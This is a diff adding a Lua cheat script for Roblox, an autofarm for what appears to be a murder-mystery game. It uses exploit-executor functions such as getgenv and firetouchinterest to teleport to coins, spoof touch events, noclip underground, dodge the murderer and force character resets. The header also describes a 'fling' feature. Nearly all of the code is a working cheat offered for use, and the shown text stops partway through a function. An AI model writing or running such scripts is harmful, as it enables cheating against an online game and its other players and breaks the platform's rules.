@@ -1,0 +1,1697 @@
+--[[
+    Hallowen Candy Farm (standalone)
+    Custom platform/teleport autofarm with a WindUI front end.
+    Controls: farm, murderer avoidance, auto reset, bag-full fling,
+    3D rendering, and an editable coin interval.
+    All toggles start OFF. RightShift toggles the window.
+]]
+
+-- ═══════════ ENV ═══════════
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+local CollectionService = game:GetService("CollectionService")
+local Camera = Workspace:FindFirstChildWhichIsA("Camera") or Workspace.CurrentCamera
+
+-- Stop any older copy so its farm loop cannot fight this custom engine.
+pcall(function()
+    local env = getgenv()
+    local oldMenu = env.FarmMenu
+    if oldMenu then
+        pcall(function() oldMenu:Set("autoFarm", false) end)
+        pcall(function() oldMenu:Destroy() end)
+    end
+    local oldFarm = env.AutoFarmTP or env["FarmAPI_" .. "Pulse"]
+    if oldFarm and oldFarm.stop then pcall(oldFarm.stop) end
+    env.AutoFarmTP = nil
+    env["FarmAPI_" .. "Pulse"] = nil
+end)
+
+-- autofarm settings (same defaults as the previous build)
+local Config = {
+    AutoFarm = false, AutoReset = false, FarmAvoidMurderer = false,
+    FlingAfterFarm = false, CoinRadius = 1000, CoinInterval = 2,
+    CoinHoldDelay = 1, EngineMode = "TP Mode", GamesenseMovement = "Underground",
+    GamesenseSpeed = 25, GamesenseCoinLimit = 40, GamesenseDownDepth = 14,
+    GamesenseRiseXZ = 4, GamesenseAvoidDistance = 40, GamesenseSafeRiseDistance = 20,
+}
+
+-- ═══════════ CUSTOM TELEPORT AUTOFARM ═══════════
+-- Creates a return platform above the active map, visits a coin, then returns
+-- to the platform. The user-configurable interval controls the wait before
+-- the next coin; bag-full detection and fling/reset remain separate.
+local FlingGate = { busy = false }
+local FarmAPI_TP = nil
+local getMurderer
+
+do
+    local session = 0
+    local running = false
+    local phase, currentCoin = "idle", nil
+    local lastCoin = nil
+    local returnPlatform, platformMap, platformAnchor = nil, nil, nil
+    local platformScanT, returnAt = 0, 0
+    local lastReturnedAt = 0
+    local coinContainers, containerScanT, containersScanned = {}, 0, false
+    local bagFrame, bagFulls, bagScanT = nil, {}, 0
+    local fullByServer = {}
+    local skipT = {}
+    local nextCoinAt = 0
+    local lastRespawn = 0
+    local farmErr = nil
+    local murdererPosCache, murdererPosT = nil, 0
+    local farmThread = nil
+    local gamesenseTarget, gamesenseWasDown, gamesenseDownRefY = nil, false, nil
+    local gamesenseNoclipCache, gamesenseSavedCharacter, gamesenseSavedHumanoid = {}, nil, nil
+    local gamesenseSavedPlatformStand = nil
+    local gamesenseLastTouch, gamesenseLastStep, gamesenseLastFallback = 0, 0, 0
+    local gamesenseSawCoins, gamesenseFinished = false, false
+
+    local function charModel()
+        local ok, ch = pcall(function()
+            return LocalPlayer.Character
+        end)
+        if not ok then return nil end
+        return ch
+    end
+
+    local function rootPart()
+        local ch = charModel()
+        if not ch then return nil end
+        local ok, rp = pcall(function()
+            return ch:FindFirstChild("HumanoidRootPart")
+        end)
+        if not ok then return nil end
+        return rp
+    end
+
+    local function humanoid()
+        local ch = charModel()
+        if not ch then return nil end
+        local ok, hum = pcall(function()
+            return ch:FindFirstChildOfClass("Humanoid")
+        end)
+        if not ok then return nil end
+        return hum
+    end
+
+    local function isAlive()
+        local hum = humanoid()
+        if not hum then return false end
+        local ok, hp = pcall(function()
+            return hum.Health
+        end)
+        if not ok then return false end
+        return (tonumber(hp) or 0) > 0
+    end
+
+    local function scanBag()
+        local pg = LocalPlayer:FindFirstChild("PlayerGui")
+        local main = pg and pg:FindFirstChild("MainGUI")
+        local gameFrame = main and main:FindFirstChild("Game")
+        bagFrame = gameFrame and gameFrame:FindFirstChild("CoinBags") or nil
+        bagFulls = {}
+        if not bagFrame then return end
+        for _, obj in ipairs(bagFrame:GetDescendants()) do
+            if obj.Name == "Full" and obj:IsA("GuiObject")
+                and not obj:FindFirstAncestorWhichIsA("LuaSourceContainer") then
+                bagFulls[#bagFulls + 1] = obj
+            end
+        end
+    end
+
+    local function bagFull()
+        for _, isFull in pairs(fullByServer) do
+            if isFull then return true end
+        end
+        if not bagFrame or not bagFrame.Parent or tick() - bagScanT > 2 then
+            bagScanT = tick()
+            scanBag()
+        end
+        if not bagFrame or not bagFrame.Visible then return false end
+        for _, marker in ipairs(bagFulls) do
+            if marker.Parent and marker.Visible then return true end
+        end
+        return false
+    end
+
+    local function listCoinContainers()
+        if not containersScanned or tick() - containerScanT > 1 then
+            containersScanned = true
+            containerScanT = tick()
+            coinContainers = {}
+            for _, obj in ipairs(Workspace:GetDescendants()) do
+                if obj.Name == "CoinContainer" then
+                    coinContainers[#coinContainers + 1] = obj
+                end
+            end
+        end
+        return coinContainers
+    end
+
+
+    local function activeCoinMap()
+        local bestContainer, bestMap, bestCount = nil, nil, -1
+        for _, container in ipairs(listCoinContainers()) do
+            if container.Parent then
+                local count = 0
+                for _, coin in ipairs(container:GetChildren()) do
+                    if coin:IsA("BasePart") and coin:FindFirstChild("TouchInterest") then
+                        count = count + 1
+                    end
+                end
+                if count > bestCount then
+                    bestContainer = container
+                    bestMap = container.Parent
+                    bestCount = count
+                end
+            end
+        end
+        if bestContainer and (not bestMap or bestMap == Workspace) then
+            bestMap = bestContainer
+        end
+        return bestContainer, bestMap
+    end
+
+    local function computePlatformAnchor(container, map, fallback)
+        local source = map
+        if not source or source == Workspace then source = container end
+        local minX, maxX, minY, maxY, minZ, maxZ
+        local function includePart(part)
+            if not part:IsA("BasePart") or part == returnPlatform then return end
+            local pos = part.Position
+            local size = part.Size or Vector3.new(0, 0, 0)
+            local x1, x2 = pos.X - size.X / 2, pos.X + size.X / 2
+            local y1, y2 = pos.Y - size.Y / 2, pos.Y + size.Y / 2
+            local z1, z2 = pos.Z - size.Z / 2, pos.Z + size.Z / 2
+            minX, maxX = math.min(minX or x1, x1), math.max(maxX or x2, x2)
+            minY, maxY = math.min(minY or y1, y1), math.max(maxY or y2, y2)
+            minZ, maxZ = math.min(minZ or z1, z1), math.max(maxZ or z2, z2)
+        end
+        if source then
+            if source:IsA("BasePart") then includePart(source) end
+            for _, obj in ipairs(source:GetDescendants()) do
+                if obj:IsA("BasePart") then includePart(obj) end
+            end
+        end
+        if not maxY then
+            return Vector3.new(fallback.X, fallback.Y + 35, fallback.Z)
+        end
+        return Vector3.new((minX + maxX) / 2, maxY + 35, (minZ + maxZ) / 2)
+    end
+
+    local function ensureReturnPlatform(root)
+        local now = tick()
+        if not returnPlatform or not returnPlatform.Parent then
+            returnPlatform = Workspace:FindFirstChild("AutoFarmReturnPlatform")
+            if returnPlatform and not returnPlatform:IsA("BasePart") then
+                returnPlatform:Destroy()
+                returnPlatform = nil
+            end
+            if not returnPlatform then
+                returnPlatform = Instance.new("Part")
+                returnPlatform.Name = "AutoFarmReturnPlatform"
+                returnPlatform.Size = Vector3.new(18, 1, 18)
+                returnPlatform.Anchored = true
+                returnPlatform.CanCollide = true
+                pcall(function() returnPlatform.CanTouch = false end)
+                returnPlatform.Transparency = 0.15
+                returnPlatform.Color = Color3.fromRGB(80, 170, 255)
+                returnPlatform.Parent = Workspace
+            end
+            platformMap, platformAnchor, platformScanT = nil, nil, 0
+        end
+        if now - platformScanT >= 1 or not platformAnchor then
+            platformScanT = now
+            local container, map = activeCoinMap()
+            if map and map ~= platformMap then
+                platformMap = map
+                platformAnchor = computePlatformAnchor(container, map, root.Position)
+            elseif not platformAnchor then
+                platformMap = map
+                platformAnchor = computePlatformAnchor(container, map, root.Position)
+            end
+        end
+        if not platformAnchor then
+            platformAnchor = Vector3.new(root.Position.X, root.Position.Y + 35, root.Position.Z)
+        end
+        if (returnPlatform.Position - platformAnchor).Magnitude > 0.1 then
+            returnPlatform.CFrame = CFrame.new(platformAnchor)
+            returnPlatform.Position = platformAnchor
+        end
+        return returnPlatform
+    end
+    local function platformStandPosition(platform)
+        return platform.Position + Vector3.new(0, platform.Size.Y / 2 + 3, 0)
+    end
+
+    local function atPlatform(root, platform)
+        return (root.Position - platformStandPosition(platform)).Magnitude <= 1
+    end
+
+    local function teleportToPlatform(root, platform)
+        local position = platformStandPosition(platform)
+        root.CFrame = CFrame.new(position)
+        root.Position = position
+        pcall(function()
+            root.AssemblyLinearVelocity = Vector3.zero
+            root.AssemblyAngularVelocity = Vector3.zero
+        end)
+    end
+
+    local function coinInterval()
+        return math.clamp(tonumber(Config.CoinInterval) or 2, 0.1, 60)
+    end
+
+    local function coinHoldDelay()
+        return math.clamp(tonumber(Config.CoinHoldDelay) or 1, 0.05, 10)
+    end
+
+    local function murdererPos()
+        if murdererPosT == 0 or os.clock() - murdererPosT > 0.25 then
+            murdererPosT = os.clock()
+            murdererPosCache = nil
+            pcall(function()
+                local mpl = getMurderer and getMurderer() or nil
+                local rp = mpl and mpl.Character and mpl.Character:FindFirstChild("HumanoidRootPart")
+                murdererPosCache = rp and rp.Position or nil
+            end)
+        end
+        return murdererPosCache
+    end
+
+    local function coinUsable(coin, myPos)
+        if not coin or not coin.Parent or not coin:IsA("BasePart") then return false end
+        if not coin:FindFirstChild("TouchInterest") then return false end
+        if (coin.Position - myPos).Magnitude > (tonumber(Config.CoinRadius) or 1000) then return false end
+        return true
+    end
+
+    local function coinNearMurderer(coin, mPos)
+        if not (coin and mPos) then return false end
+        return Vector3.new(coin.Position.X - mPos.X, 0, coin.Position.Z - mPos.Z).Magnitude < 12
+    end
+
+    local function chooseCoin(myPos, mPos, excludeCoin)
+        local best, bestDistance
+        local now = tick()
+        for _, container in ipairs(listCoinContainers()) do
+            if container.Parent then
+                for _, coin in ipairs(container:GetChildren()) do
+                    if coin ~= excludeCoin and coinUsable(coin, myPos)
+                        and (skipT[coin] or 0) <= now then
+                        if coinNearMurderer(coin, mPos) then
+                            skipT[coin] = now + 3
+                        else
+                            local distance = (coin.Position - myPos).Magnitude
+                            if not bestDistance or distance < bestDistance then
+                                best, bestDistance = coin, distance
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        return best
+    end
+
+    local function charTouchParts(ch)
+        local parts = {}
+        local head = ch:FindFirstChild("Head")
+        if head then parts[#parts + 1] = head end
+        for _, acc in ipairs(ch:GetChildren()) do
+            if acc:IsA("Accessory") then
+                local handle = acc:FindFirstChild("Handle")
+                if handle then parts[#parts + 1] = handle end
+            end
+        end
+        for _, name in ipairs({ "UpperTorso", "Torso", "HumanoidRootPart", "LowerTorso" }) do
+            local part = ch:FindFirstChild(name)
+            if part then parts[#parts + 1] = part end
+        end
+        return parts
+    end
+
+    local function touchCoin(ch, coin)
+        if type(firetouchinterest) ~= "function" or not (ch and coin and coin.Parent) then return end
+        for _, part in ipairs(charTouchParts(ch)) do
+            pcall(function()
+                firetouchinterest(part, coin, 0)
+                firetouchinterest(part, coin, 1)
+            end)
+        end
+    end
+
+    local function teleportToCoin(root, coin)
+        local position = coin.Position
+        root.CFrame = CFrame.new(position)
+        root.Position = position
+        pcall(function()
+            root.AssemblyLinearVelocity = Vector3.zero
+            root.AssemblyAngularVelocity = Vector3.zero
+        end)
+        touchCoin(charModel(), coin)
+    end
+
+    local function autoRespawn()
+        local hum = humanoid()
+        if hum and hum.Health > 0 then
+            hum.Health = 0
+            lastRespawn = tick()
+        end
+    end
+
+    local function gamesenseFlatDistance(a, b)
+        return Vector3.new(a.X - b.X, 0, a.Z - b.Z).Magnitude
+    end
+
+    local function gamesenseCoinAvailable(coin, position)
+        if not coin or not coin.Parent or not coin:IsA("BasePart") then return false end
+        local okCollected, collected = pcall(function() return coin:GetAttribute("Collected") end)
+        local okDelete, deleted = pcall(function() return coin:GetAttribute("Delete") end)
+        if (okCollected and collected) or (okDelete and deleted) then return false end
+        if position and (coin.Position - position).Magnitude > (tonumber(Config.CoinRadius) or 1000) then return false end
+        return true
+    end
+
+    local function gamesenseCoins(position)
+        local list, seen = {}, {}
+        local function add(coin)
+            if not seen[coin] and gamesenseCoinAvailable(coin, position) then
+                seen[coin] = true
+                list[#list + 1] = coin
+            end
+        end
+        local ok, tagged = pcall(function() return CollectionService:GetTagged("CoinVisual") end)
+        if ok and type(tagged) == "table" then
+            for _, coin in ipairs(tagged) do add(coin) end
+        end
+        if #list == 0 then
+            for _, container in ipairs(listCoinContainers()) do
+                if container and container.Parent then
+                    for _, coin in ipairs(container:GetChildren()) do add(coin) end
+                end
+            end
+        end
+        return list
+    end
+
+    local function gamesenseNearestCoin(position, list)
+        local best, bestDistance = nil, math.huge
+        for _, coin in ipairs(list) do
+            local distance = (coin.Position - position).Magnitude
+            if distance < bestDistance then best, bestDistance = coin, distance end
+        end
+        return best
+    end
+
+    local function gamesensePickCoin(position, list, murdererPosition)
+        if not (Config.FarmAvoidMurderer and murdererPosition) then
+            return gamesenseNearestCoin(position, list)
+        end
+        local avoidDistance = math.clamp(tonumber(Config.GamesenseAvoidDistance) or 40, 10, 100)
+        local safe, safeDistance, farthest, farthestDistance = nil, math.huge, nil, -1
+        for _, coin in ipairs(list) do
+            local murdererDistance = gamesenseFlatDistance(coin.Position, murdererPosition)
+            if murdererDistance > farthestDistance then
+                farthest, farthestDistance = coin, murdererDistance
+            end
+            if murdererDistance >= avoidDistance then
+                local distance = (coin.Position - position).Magnitude
+                if distance < safeDistance then safe, safeDistance = coin, distance end
+            end
+        end
+        if safe then return safe end
+        if farthest and farthestDistance >= avoidDistance * 0.6 then return farthest end
+        return nil
+    end
+
+    local function gamesenseAvoidSteer(current, destination, murdererPosition)
+        if not (Config.FarmAvoidMurderer and murdererPosition) then return destination end
+        local avoidDistance = math.clamp(tonumber(Config.GamesenseAvoidDistance) or 40, 10, 100)
+        local murdererDistance = gamesenseFlatDistance(current, murdererPosition)
+        if murdererDistance >= avoidDistance then return destination end
+        local away = Vector3.new(current.X - murdererPosition.X, 0, current.Z - murdererPosition.Z)
+        if away.Magnitude < 0.1 then away = Vector3.new(1, 0, 0) end
+        away = away.Unit
+        local desired = Vector3.new(destination.X - current.X, 0, destination.Z - current.Z)
+        local distance = desired.Magnitude
+        if distance < 0.1 then return destination end
+        local weight = 1 + (1 - murdererDistance / avoidDistance) * 2
+        local blend = desired.Unit + away * weight
+        if blend.Magnitude < 0.1 then blend = away else blend = blend.Unit end
+        local nextPosition = current + blend * distance
+        return Vector3.new(nextPosition.X, destination.Y, nextPosition.Z)
+    end
+
+    local function gamesenseCoinTouches(coin)
+        if type(firetouchinterest) ~= "function" or not coin or not coin.Parent then return end
+        local now = os.clock()
+        if now - gamesenseLastTouch < 0.05 then return end
+        gamesenseLastTouch = now
+        local root = rootPart()
+        if not root then return end
+        local targets, seen = {}, {}
+        local function add(part)
+            if not part or seen[part] then return end
+            local ok, valid = pcall(function()
+                return part:IsA("BasePart") and (part:FindFirstChildOfClass("TouchTransmitter") ~= nil
+                    or part:FindFirstChild("TouchInterest") ~= nil)
+            end)
+            if ok and valid then seen[part] = true targets[#targets + 1] = part end
+        end
+        add(coin)
+        for _, child in ipairs(coin:GetChildren()) do add(child) end
+        local parent = coin.Parent
+        if parent then
+            add(parent)
+            for _, child in ipairs(parent:GetChildren()) do add(child) end
+        end
+        if #targets == 0 then targets[1] = coin end
+        for _, target in ipairs(targets) do
+            pcall(function()
+                firetouchinterest(root, target, 0)
+                firetouchinterest(root, target, 1)
+            end)
+        end
+    end
+
+    local function gamesenseCurrentCoinCount()
+        local ok, count = pcall(function()
+            local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
+            local main = playerGui and playerGui:FindFirstChild("MainGUI")
+            local gameGui = main and (main:FindFirstChild("Game") or main)
+            local bags = gameGui and gameGui:FindFirstChild("CoinBags")
+            local container = bags and bags:FindFirstChild("Container")
+            local coin = container and container:FindFirstChild("Coin")
+            local currency = coin and coin:FindFirstChild("CurrencyFrame")
+            local icon = currency and currency:FindFirstChild("Icon")
+            local label = icon and icon:FindFirstChild("Coins")
+            if not label then return 0 end
+            local text = tostring(label.Text or "")
+            return tonumber(text) or tonumber(string.match(text, "%d+")) or 0
+        end)
+        return ok and count or 0
+    end
+
+    local function gamesenseReturnToSurface(root)
+        if not gamesenseWasDown then return end
+        root = root or (gamesenseSavedCharacter and gamesenseSavedCharacter:FindFirstChild("HumanoidRootPart")) or rootPart()
+        if not root then gamesenseWasDown = false return end
+        local origin = root.Position
+        local y = nil
+        pcall(function()
+            local params = RaycastParams.new()
+            params.FilterType = Enum.RaycastFilterType.Exclude
+            params.FilterDescendantsInstances = { gamesenseSavedCharacter or charModel() }
+            params.IgnoreWater = true
+            local result = Workspace:Raycast(origin, Vector3.new(0, 400, 0), params)
+            if result then y = result.Position.Y + 5 end
+        end)
+        if not y and gamesenseDownRefY then y = gamesenseDownRefY + 5 end
+        if y then
+            local position = Vector3.new(origin.X, y, origin.Z)
+            pcall(function()
+                root.CFrame = CFrame.new(position)
+                root.Position = position
+                root.AssemblyLinearVelocity = Vector3.zero
+                root.AssemblyAngularVelocity = Vector3.zero
+            end)
+        end
+        gamesenseWasDown = false
+    end
+
+    local function gamesenseRestore(root)
+        gamesenseReturnToSurface(root)
+        local humanoidToRestore = gamesenseSavedHumanoid or humanoid()
+        if humanoidToRestore and gamesenseSavedPlatformStand ~= nil then
+            pcall(function() humanoidToRestore.PlatformStand = gamesenseSavedPlatformStand end)
+        end
+        for part, canCollide in pairs(gamesenseNoclipCache) do
+            if part and part.Parent then pcall(function() part.CanCollide = canCollide end) end
+        end
+        gamesenseNoclipCache = {}
+        gamesenseSavedCharacter, gamesenseSavedHumanoid, gamesenseSavedPlatformStand = nil, nil, nil
+    end
+
+    local function gamesenseSetNoclip(on)
+        if not on then gamesenseRestore()
+        else
+            local character = charModel()
+            local hum = humanoid()
+            if not character then return end
+            if gamesenseSavedCharacter and gamesenseSavedCharacter ~= character then
+                gamesenseRestore(gamesenseSavedCharacter:FindFirstChild("HumanoidRootPart"))
+            end
+            if not gamesenseSavedCharacter then
+                gamesenseSavedCharacter = character
+                gamesenseSavedHumanoid = hum
+                gamesenseSavedPlatformStand = hum and hum.PlatformStand or false
+            end
+            if hum then pcall(function() hum.PlatformStand = true end) end
+            for _, part in ipairs(character:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    if gamesenseNoclipCache[part] == nil then gamesenseNoclipCache[part] = part.CanCollide end
+                    part.CanCollide = false
+                end
+            end
+        end
+    end
+
+    local function gamesenseMove(root, destination, dt)
+        local direction = destination - root.Position
+        local distance = direction.Magnitude
+        local nextPosition = destination
+        if distance > 0.1 then
+            local speed = math.clamp(tonumber(Config.GamesenseSpeed) or 25, 10, 50)
+            nextPosition = root.Position + direction.Unit * math.min(speed * dt, distance)
+        end
+        local frame = CFrame.new(nextPosition)
+        if Config.GamesenseMovement == "Underground" then
+            frame = frame * CFrame.Angles(-math.pi * 0.5, 0, 0)
+            gamesenseWasDown = true
+        end
+        pcall(function()
+            root.CFrame = frame
+            root.Position = nextPosition
+            root.AssemblyLinearVelocity = Vector3.zero
+            root.AssemblyAngularVelocity = Vector3.zero
+        end)
+    end
+
+    local function gamesenseStep(root, now)
+        local elapsed = gamesenseLastStep > 0 and now - gamesenseLastStep or 0.05
+        local dt = math.clamp(elapsed, 0.01, 0.25)
+        gamesenseLastStep = now
+
+        if bagFull() then
+            gamesenseTarget = nil
+            gamesenseRestore(root)
+            phase = "full"
+            return
+        end
+        if FlingGate.busy then
+            gamesenseTarget = nil
+            gamesenseRestore(root)
+            phase = "busy"
+            return
+        end
+
+        local coinCount = gamesenseCurrentCoinCount()
+        local coinLimit = math.clamp(tonumber(Config.GamesenseCoinLimit) or 40, 10, 50)
+        if Config.AutoReset and coinCount >= coinLimit and now - lastRespawn > 3 then
+            gamesenseTarget = nil
+            gamesenseRestore(root)
+            phase = "full"
+            autoRespawn()
+            return
+        end
+
+        local list = gamesenseCoins(root.Position)
+        if #list == 0 then
+            gamesenseTarget = nil
+            gamesenseRestore(root)
+            phase = "wait"
+            if gamesenseSawCoins and not gamesenseFinished and Config.AutoReset and coinCount > 0
+                and now - lastRespawn > 3 then
+                gamesenseFinished = true
+                autoRespawn()
+            end
+            return
+        end
+        gamesenseSawCoins = true
+        gamesenseFinished = false
+
+        local murdererPosition = nil
+        if Config.FarmAvoidMurderer then
+            local murdererRoot = murdererPos()
+            murdererPosition = murdererRoot and murdererRoot.Position or nil
+        end
+        if not gamesenseCoinAvailable(gamesenseTarget, root.Position)
+            or (gamesenseTarget and Config.FarmAvoidMurderer and murdererPosition
+                and gamesenseFlatDistance(gamesenseTarget.Position, murdererPosition)
+                    < math.clamp(tonumber(Config.GamesenseAvoidDistance) or 40, 10, 100) * 0.6) then
+            gamesenseTarget = gamesensePickCoin(root.Position, list, murdererPosition)
+        end
+
+        if gamesenseTarget then
+            gamesenseSetNoclip(true)
+            local coinPosition = gamesenseTarget.Position
+            gamesenseDownRefY = coinPosition.Y
+            local destination = coinPosition
+            if Config.GamesenseMovement == "Underground" then
+                local xzDistance = gamesenseFlatDistance(root.Position, coinPosition)
+                local safeRiseDistance = math.clamp(tonumber(Config.GamesenseSafeRiseDistance) or 20, 5, 60)
+                local safeToRise = not murdererPosition
+                    or gamesenseFlatDistance(root.Position, murdererPosition) > safeRiseDistance
+                if xzDistance <= math.clamp(tonumber(Config.GamesenseRiseXZ) or 4, 1, 10) and safeToRise then
+                    destination = coinPosition
+                    gamesenseCoinTouches(gamesenseTarget)
+                else
+                    local depth = math.clamp(tonumber(Config.GamesenseDownDepth) or 14, 5, 40)
+                    destination = Vector3.new(coinPosition.X, coinPosition.Y - depth, coinPosition.Z)
+                end
+            else
+                if gamesenseWasDown then gamesenseReturnToSurface(root) end
+                if (coinPosition - root.Position).Magnitude <= 6 then
+                    gamesenseCoinTouches(gamesenseTarget)
+                end
+            end
+            destination = gamesenseAvoidSteer(root.Position, destination, murdererPosition)
+            gamesenseMove(root, destination, dt)
+            phase = "gamesense-moving"
+            return
+        end
+
+        if murdererPosition then
+            gamesenseSetNoclip(true)
+            local away = Vector3.new(root.Position.X - murdererPosition.X, 0, root.Position.Z - murdererPosition.Z)
+            if away.Magnitude < 0.1 then away = Vector3.new(1, 0, 0) end
+            away = away.Unit
+            local y = root.Position.Y
+            if Config.GamesenseMovement == "Underground" and gamesenseDownRefY then
+                y = gamesenseDownRefY - math.clamp(tonumber(Config.GamesenseDownDepth) or 14, 5, 40)
+            end
+            gamesenseMove(root, root.Position + away * 40 + Vector3.new(0, y - root.Position.Y, 0), dt)
+            phase = "gamesense-avoiding"
+        else
+            gamesenseRestore(root)
+            phase = "wait"
+        end
+    end
+
+    local function setEngineMode(mode)
+        assert(mode == "TP Mode" or mode == "Gamesense Mode", "Unknown farm mode")
+        if Config.EngineMode == mode then return false end
+        if Config.EngineMode == "Gamesense Mode" then gamesenseRestore(rootPart()) end
+        if returnPlatform then pcall(function() returnPlatform:Destroy() end) end
+        returnPlatform, platformMap, platformAnchor = nil, nil, nil
+        gamesenseTarget = nil
+        currentCoin, lastCoin = nil, nil
+        returnAt, lastReturnedAt, nextCoinAt = 0, 0, 0
+        gamesenseLastStep = 0
+        Config.EngineMode = mode
+        phase = "idle"
+        return true
+    end
+
+    local function setGamesenseMovement(mode)
+        assert(mode == "Underground" or mode == "Direct", "Unknown Gamesense movement")
+        if Config.GamesenseMovement == mode then return false end
+        if Config.EngineMode == "Gamesense Mode" and mode == "Direct" and gamesenseWasDown then
+            gamesenseReturnToSurface(rootPart())
+        end
+        gamesenseTarget = nil
+        Config.GamesenseMovement = mode
+        return true
+    end
+
+    local function farmStep()
+        if not running then
+            phase = "idle"
+            return
+        end
+        if not isAlive() then
+            currentCoin, gamesenseTarget = nil, nil
+            gamesenseRestore(rootPart())
+            phase = "idle"
+            return
+        end
+        local root = rootPart()
+        if not root then
+            currentCoin, gamesenseTarget = nil, nil
+            gamesenseRestore()
+            phase = "idle"
+            return
+        end
+        local now = tick()
+        if Config.EngineMode == "Gamesense Mode" then
+            if returnPlatform then pcall(function() returnPlatform:Destroy() end) end
+            returnPlatform, platformMap, platformAnchor = nil, nil, nil
+            return gamesenseStep(root, now)
+        end
+        gamesenseRestore(root)
+        local platform = ensureReturnPlatform(root)
+
+        if phase == "returning" then
+            if now >= returnAt then
+                teleportToPlatform(root, platform)
+                currentCoin = nil
+                if bagFull() then
+                    phase = "full"
+                    lastReturnedAt = 0
+                    nextCoinAt = 0
+                else
+                    phase = "cooldown"
+                    lastReturnedAt = now
+                    nextCoinAt = now + coinInterval()
+                end
+            end
+            return
+        end
+
+        if bagFull() then
+            currentCoin = nil
+            lastReturnedAt = 0
+            nextCoinAt = 0
+            phase = "full"
+            if not atPlatform(root, platform) then
+                teleportToPlatform(root, platform)
+            end
+            return
+        end
+        if FlingGate.busy then
+            currentCoin = nil
+            lastReturnedAt = 0
+            nextCoinAt = 0
+            phase = "busy"
+            if not atPlatform(root, platform) then
+                teleportToPlatform(root, platform)
+            end
+            return
+        end
+        if phase == "full" or phase == "busy" then
+            currentCoin, lastCoin = nil, nil
+            lastReturnedAt = 0
+            nextCoinAt = 0
+            phase = "idle"
+        end
+        if phase == "idle" then
+            if not atPlatform(root, platform) then
+                teleportToPlatform(root, platform)
+            end
+            phase = "cooldown"
+            nextCoinAt = now + 0.05
+            return
+        end
+        if phase == "cooldown" and lastReturnedAt > 0 then
+            nextCoinAt = lastReturnedAt + coinInterval()
+        end
+        if now < nextCoinAt then
+            if not atPlatform(root, platform) then
+                teleportToPlatform(root, platform)
+            end
+            return
+        end
+
+        local mPos = murdererPos()
+        if currentCoin and not coinUsable(currentCoin, root.Position) then
+            currentCoin = nil
+        elseif currentCoin and coinNearMurderer(currentCoin, mPos) then
+            skipT[currentCoin] = now + 3
+            currentCoin, lastCoin = nil, nil
+            nextCoinAt = now
+        end
+
+        local coin = chooseCoin(root.Position, mPos, lastCoin)
+        if not coin and lastCoin and coinUsable(lastCoin, root.Position)
+            and not coinNearMurderer(lastCoin, mPos)
+            and (skipT[lastCoin] or 0) <= now then
+            coin = lastCoin
+        end
+        if coin then
+            currentCoin = coin
+            lastCoin = coin
+            phase = "returning"
+            returnAt = now + coinHoldDelay()
+            teleportToCoin(root, coin)
+            return
+        end
+        currentCoin = nil
+        phase = "wait"
+        lastReturnedAt = 0
+        nextCoinAt = now + 0.25
+        if not atPlatform(root, platform) then
+            teleportToPlatform(root, platform)
+        end
+    end
+    local function roundReset()
+        table.clear(fullByServer)
+        coinContainers, containerScanT, containersScanned = {}, 0, false
+        platformMap, platformAnchor, platformScanT = nil, nil, 0
+        skipT = {}
+        currentCoin, lastCoin, gamesenseTarget = nil, nil, nil
+        gamesenseRestore(rootPart())
+        gamesenseSawCoins, gamesenseFinished = false, false
+        gamesenseLastStep, gamesenseLastTouch = 0, 0
+        returnAt, lastReturnedAt = 0, 0
+        nextCoinAt = 0
+        phase = running and "wait" or "idle"
+    end
+
+    pcall(function()
+        LocalPlayer.CharacterAdded:Connect(function(ch)
+            local hum = ch:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hum.Died:Connect(function()
+                    currentCoin, lastCoin, gamesenseTarget = nil, nil, nil
+                    gamesenseRestore()
+                    gamesenseSawCoins, gamesenseFinished = false, false
+                    gamesenseLastStep, gamesenseLastTouch = 0, 0
+                    returnAt, lastReturnedAt = 0, 0
+                    nextCoinAt = 0
+                    skipT = {}
+                    platformMap, platformAnchor, platformScanT = nil, nil, 0
+                    table.clear(fullByServer)
+                    phase = "idle"
+                end)
+            end
+        end)
+    end)
+    pcall(function()
+        local ch = LocalPlayer.Character
+        local hum = ch and ch:FindFirstChildOfClass("Humanoid")
+        if hum then
+            hum.Died:Connect(function()
+                currentCoin, lastCoin, gamesenseTarget = nil, nil, nil
+                gamesenseRestore()
+                gamesenseSawCoins, gamesenseFinished = false, false
+                gamesenseLastStep, gamesenseLastTouch = 0, 0
+                returnAt, lastReturnedAt = 0, 0
+                nextCoinAt = 0
+                skipT = {}
+                platformMap, platformAnchor, platformScanT = nil, nil, 0
+                table.clear(fullByServer)
+                phase = "idle"
+            end)
+        end
+    end)
+
+    do
+        local coinWired, roundStartWired, coinsStartedWired = false, false, false
+        task.spawn(function()
+            while true do
+                pcall(function()
+                    local remotes = ReplicatedStorage:FindFirstChild("Remotes")
+                    local gameplay = remotes and remotes:FindFirstChild("Gameplay")
+                    if gameplay then
+                        if not coinWired then
+                            local signal = gameplay:FindFirstChild("CoinCollected")
+                            if signal then
+                                signal.OnClientEvent:Connect(function(coinType, got, cap)
+                                    if type(coinType) == "string" and type(got) == "number" and type(cap) == "number" then
+                                        fullByServer[coinType] = got >= cap
+                                    end
+                                end)
+                                coinWired = true
+                            end
+                        end
+                        if not roundStartWired then
+                            local signal = gameplay:FindFirstChild("RoundStart")
+                            if signal then
+                                signal.OnClientEvent:Connect(roundReset)
+                                roundStartWired = true
+                            end
+                        end
+                        if not coinsStartedWired then
+                            local signal = gameplay:FindFirstChild("CoinsStarted")
+                            if signal then
+                                signal.OnClientEvent:Connect(roundReset)
+                                coinsStartedWired = true
+                            end
+                        end
+                    end
+                end)
+                if coinWired and roundStartWired and coinsStartedWired then return end
+                task.wait(1)
+            end
+        end)
+    end
+
+    FarmAPI_TP = {
+        setMode = function(mode) return setEngineMode(mode) end,
+        setMovementStyle = function(mode) return setGamesenseMovement(mode) end,
+        start = function()
+            if running then return end
+            session = session + 1
+            local mySession = session
+            running = true
+            coinContainers, containerScanT, containersScanned = {}, 0, false
+            platformMap, platformAnchor, platformScanT = nil, nil, 0
+            skipT = {}
+            gamesenseRestore(rootPart())
+            currentCoin, lastCoin, gamesenseTarget = nil, nil, nil
+            gamesenseSawCoins, gamesenseFinished = false, false
+            gamesenseLastStep, gamesenseLastTouch = 0, 0
